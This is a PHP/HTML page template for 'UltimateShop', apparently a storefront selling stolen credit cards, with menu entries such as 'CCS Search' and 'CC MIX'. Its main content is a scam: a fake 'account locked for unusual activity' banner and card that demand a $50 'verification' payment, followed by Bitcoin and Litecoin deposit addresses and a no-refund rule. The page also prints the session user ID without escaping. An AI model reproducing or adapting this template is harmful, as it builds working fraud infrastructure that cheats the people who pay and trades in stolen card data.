<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en" data-layout="topnav">
<head>
    <meta charset="utf-8">
    <title>UltimateShop - Validation Default</title>
    <link rel="shortcut icon" href="assets3/images/logo2.png">
    
    <!-- CSS Files -->
    <link rel="stylesheet" type="text/css" href="assets3/d9ed5ad3/gridview/styles.css">
    <link href="assets3/css/app-saas.min.css" rel="stylesheet" type="text/css" id="app-style">
    <link href="assets3/css/icons.min.css" rel="stylesheet" type="text/css">
    <link href="assets3/vendor/select2/css/select2.min.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="assets3/css/pager.css">
    <link rel="stylesheet" href="assets3/vendor/daterangepicker/daterangepicker.css">
    <link href="assets3/vendor/admin-resources/jquery.vectormap/jquery-jvectormap-1.2.2.css" rel="stylesheet" type="text/css">
    
    <!-- JS Files -->
    <script src="assets3/9f54d4f8/jquery.js"></script>
    <script src="assets3/9f54d4f8/jquery.ba-bbq.js"></script>
    <script src="assets3/js/hyper-config.js"></script>
</head>
<body>
    <div class="wrapper">
        <!-- Account Status Notification - Added notification banner -->
        <div class="alert alert-danger text-center" style="margin-bottom: 0; border-radius: 0; font-weight: bold; padding: 15px;">
            <i class="mdi mdi-lock-alert me-1" style="font-size: 20px;"></i>
            ACCOUNT NOTICE: For some unusual activity, We have locked your account temporarily. 
            please make a minimum payment of 50$.It will be added to your account after 3 confirmation on Blockchain.
            <a href="#payment-section" class="btn btn-sm btn-danger ms-3">Verify Account Now</a>
        </div>
        
        <div class="navbar-custom">
            <div class="topbar container-fluid">
                <div class="d-flex align-items-center gap-lg-2 gap-1">
                    <button class="button-toggle-menu"><i class="mdi mdi-menu"></i></button>
                    <button class="navbar-toggle" data-bs-toggle="collapse" data-bs-target="#topnav-menu-content">
                        <div class="lines">
                            <span></span><span></span><span></span>
                        </div>
                    </button>
                </div>
                <ul class="topbar-menu d-flex align-items-center gap-3">
                    <li class="d-none d-sm-inline-block">
                        <div class="nav-link" id="light-dark-mode" data-bs-toggle="tooltip" data-bs-placement="left" title="Theme Mode">
                            <i class="ri-moon-line font-22"></i>
                        </div>
                    </li>
                    <div id="reseller-link">
                        <a href="#" class="btn btn-warning" style="color: black !important;">Apply for reseller</a>
                    </div>
                    <span class="account-user-avatar"><h5 class="my-0">Discount : 0% </h5></span>
                    <li class="dropdown">
                        <a class="nav-link dropdown-toggle arrow-none nav-user px-2" data-bs-toggle="dropdown" href="#">
                            <span class="account-user-avatar">
                                <h5 class="arrow-down"><?php echo $_SESSION['user_id']; ?><br><span style="color:green"><b>0.00 $</b></span></h5>
                            </span>
                        </a>
                        <div class="dropdown-menu dropdown-menu-end dropdown-menu-animated profile-dropdown">
                            <div class="dropdown-header noti-title">
                                <h6 class="text-overflow m-0">Welcome !</h6>
                            </div>
                            <a href="#" class="dropdown-item"><i class="mdi mdi-logout me-1"></i> Profile</a>
                            <a href="../index.html" class="dropdown-item"><i class="mdi mdi-logout me-1"></i> Logout</a>
                        </div>
                    </li>
                </ul>
            </div>
        </div>

        <div class="topnav active">
            <div class="container-fluid">
                <nav class="navbar navbar-expand-lg active">
                    <div class="collapse navbar-collapse" id="topnav-menu-content">
                        <ul class="navbar-nav active">
                            <li class="nav-item dropdown">
                                <a class="nav-link dropdown-toggle arrow-none active" href="#" style="color:white !important">
                                    <i class="uil-newspaper"></i>News
                                </a>
                            </li>
                            <li class="nav-item dropdown">
                                <a class="nav-link dropdown-toggle arrow-none" href="#" style="color:white !important " data-bs-toggle="dropdown">
                                    <i class="uil-atm-card"></i>CCS <div class="arrow-down"></div>
                                </a>
                                <div class="dropdown-menu">
                                    <a href="#" class="dropdown-item">CCS Search</a>
                                    <a href="#" class="dropdown-item">CCS CART</a>
                                    <a href="#" class="dropdown-item">CCS ORDERS</a>
                                </div>
                            </li>
                            <li class="nav-item dropdown" style="color:black !important;background-color: #fcc53b !important;">
                                <a class="nav-link dropdown-toggle arrow-none" href="#" style="color:white !important">
                                    <i class="uil-dashboard"></i>CC MIX
                                </a>
                            </li>
                        </ul>
                    </div>
                </nav>
            </div>
        </div>

        <div class="content-page">
            <div class="content">
                <div class="container-fluid">
                    <br>
                    
                    <!-- Account Verification Required Card - Added account status card -->
                    <div class="card bg-danger bg-opacity-80 text-white mb-3">
                        <div class="card-body">
                            <h5 class="card-title mb-2">⚠️ Account Verification Required</h5>
                            <div class="pt-1">
                                <p style="color:white">
                                    Your account requires verification to continue accessing our services. Please note:
                                </p>
                                <ul style="color:white">
                                    <li>Account functionality is currently limited</li>
                                    <li>Complete verification with a minimum payment of $50.00</li>
                                    <li>Balance will be added to your account</li>
                                    <li>New accounts created before verification will be automatically restricted</li>
                                </ul>
                                <p style="color:white; margin-top: 10px;">
                                    <strong>Common reasons for account restriction:</strong>
                                </p>
                                <ul style="color:white">
                                    <li>Locked accounts: due to spam</li>
                                    <li>Locked accounts: due to multiple refunds</li>
                                    <li>Locked accounts: due to multiple accounts</li>
                                    <li>Locked accounts: due to multiple IPs logging into different accounts</li>
                                </ul>
                                <div class="text-center mt-3">
                                    <a href="#payment-section" class="btn btn-light">Complete Verification Now</a>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="card bg-warning bg-opacity-80 text-white mb-0">
                        <div class="card-body">
                            <h5 class="card-title mb-0">Information</h5>
                            <div id="cardCollpase3" class="collapse pt-3 show">
                                <span style="color:black">
                                    - Each Address is for 1 payment/transaction only!<br>
                                    - Any payment above 500$ will be credited 10% bonus.<br>
                                    - We will credit your payment after 3 confirmations on blockchain.<br>
                                    - We do not refund any balance.
                                </span>
                            </div>
                        </div>
                    </div>
                    <br>

                    <legend>Add Funds</legend>
                    <div class="row" id="payment-section">
                        <div class="col-md-6">
                            <div class="card bg-light">
                                <div class="card-body">
                                    <div class="d-flex align-items-center mb-3">
                                        <img src="assets3/images/bitcoin.png" alt="Bitcoin" class="me-3" style="width: 64px; height: 64px;">
                                        <div>
                                            <h4 class="mt-0 mb-1 font-16 fw-semibold">Bitcoin - BTC( 6% Fee )</h4>
                                            <p class="mb-0" style="color:green !important; font-weight: bold;">50$ MINIMUM</p>
                                        </div>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <label for="btc-address" class="form-label">Send any amount to this Address</label>
                                        <input type="text" id="btc-address" class="form-control" value="bc1q5vvr47jytlujuejyyt703x6g6l0cfeke5h4cm0">
                                    </div>
                                    
                                    <button class="btn btn-warning" style="color:black !important; background-color: #fcc53b;">Press this button after Paying</button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="col-md-6">
                            <div class="card bg-light">
                                <div class="card-body">
                                    <div class="d-flex align-items-center mb-3">
                                        <img src="assets3/images/ltc.png" alt="Litecoin" class="me-3" style="width: 64px; height: 64px;">
                                        <div>
                                            <h4 class="mt-0 mb-1 font-16 fw-semibold">Litecoin - LTC ( 3% Fee )</h4>
                                            <p class="mb-0" style="color:green !important; font-weight: bold;">50$ MINIMUM</p>
                                        </div>
                                    </div>
                                    
                                    <div class="mb-3">
                                        <label for="ltc-address" class="form-label">Send any amount to this Address</label>
                                        <input type="text" id="ltc-address" class="form-control" value="ltc1q69r722ucscx5j98mfmytl6hz78a4lgdlz4f3dw">
                                    </div>
                                    
                                    <button class="btn btn-warning" style="color:black !important; background-color: #fcc53b;">Press this button after Paying</button>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <br>
                </div>
            </div>
        </div>
    </div>

    <script src="assets3/js/vendor.min.js"></script>
    <script src="assets3/js/app.min.js"></script>
</body>
</html>